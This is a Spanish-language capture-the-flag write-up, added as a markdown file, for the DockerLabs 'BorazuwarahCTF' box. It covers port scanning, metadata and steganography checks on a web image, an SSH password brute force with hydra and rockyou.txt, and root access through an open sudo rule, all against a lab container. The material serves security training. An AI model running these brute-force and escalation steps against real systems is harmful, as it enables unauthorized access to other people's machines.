@@ -1,0 +1,166 @@
+---
+type: writeup
+title: BorazuwarahCTF
+description: ""
+lang: es
+draft: false
+image: ../../../images/writeups/dockerlabs/dockerlabs.webp
+platform: dockerlabs
+url: https://dockerlabs.es/
+difficulty: muyfacil
+os: linux
+hints: []
+tags: []
+---
+
+## Enumeration
+
+Escanemos todos los puertos para ver cuáles están abiertos y qué servicios corren en ellos.
+
+```bash
+sudo nmap -p- -sS --min-rate 5000 -Pn -n -vv -oA nmap/allports 172.17.0.2
+```
+
+```plaintext
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 64
+80/tcp open  http    syn-ack ttl 64
+```
+
+Escaneamos los puertos abiertos para ver más detalles sobre ellos.
+
+```bash
+nmap -p 22,80 -sCV -oA nmap/openports 172.17.0.2
+```
+
+```plaintext
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
+| ssh-hostkey: 
+|   256 3d:fd:d7:c8:17:97:f5:12:b1:f5:11:7d:af:88:06:fe (ECDSA)
+|_  256 43:b3:ba:a9:32:c9:01:43:ee:62:d0:11:12:1d:5d:17 (ED25519)
+80/tcp open  http    Apache httpd 2.4.59 ((Debian))
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.4.59 (Debian)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+El sitio web contiene solo una imagen.
+
+![Website](@images/writeups/dockerlabs/borazuwarahctf/website.png)
+
+La descargamos.
+
+```bash
+wget -qO imagen.jpeg http://172.17.0.2/imagen.jpeg
+```
+
+Leemos los metadatos.
+
+```bash
+exiftool imagen.jpeg
+```
+
+```plaintext
+<SNIP>
+XMP Toolkit                     : Image::ExifTool 12.76
+Description                     : ---------- User: borazuwarah ----------
+Title                           : ---------- Password:  ----------
+<SNIP>
+```
+
+Vemos si la imagen contiene datos ocultos.
+
+```bash
+steghide info imagen.jpeg 
+```
+
+Como no tiene contraseña no le pasamos `passphrase`.
+
+```plaintext
+"imagen.jpeg":
+  format: jpeg
+  capacity: 704.0 Byte
+Try to get information about embedded data ? (y/n) y
+Enter passphrase: 
+  embedded file "secreto.txt":
+    size: 104.0 Byte
+    encrypted: rijndael-128, cbc
+    compressed: yes
+```
+
+Extraemos el archivo oculto.
+
+```bash
+steghide extract -sf imagen.jpeg 
+```
+
+Como no tiene contraseña no le pasamos `passphrase`.
+
+```
+Enter passphrase: 
+wrote extracted data to "secreto.txt".
+```
+
+Leemos el archivo `secreto.txt`.
+
+```bash
+cat secreto.txt 
+```
+
+```plaintext
+Sigue buscando, aquí no está to solución
+aunque te dejo una pista....
+sigue buscando en la imagen!!!
+```
+
+## Exploitation
+
+Hacemos fuerza bruta con el usuario encontrado sobre el servicio ssh.
+
+```bash
+hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -I -t 16 -F
+```
+
+```plaintext
+[22][ssh] host: 172.17.0.2   login: borazuwarah   password: 123456
+```
+
+Nos conectamos por ssh.
+
+```bash
+ssh borazuwarah@172.17.0.2
+```
+
+## Privilege Escalation
+
+Listamos los privilegios y comandos permitidos que tiene el usuario actual dentro del sistema utilizando `sudo`.
+
+```bash
+sudo -l
+```
+
+```plaintext
+Matching Defaults entries for borazuwarah on 62211f59ce81:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User borazuwarah may run the following commands on 62211f59ce81:
+    (ALL : ALL) ALL
+    (ALL) NOPASSWD: /bin/bash
+```
+
+Nos convertimos en el usuario `root`.
+
+```bash
+sudo -i
+```
+
+Verificamos que estamos como el usuario `root`.
+
+```bash
+id
+```
+
+```plaintext
+uid=0(root) gid=0(root) groups=0(root)
+```
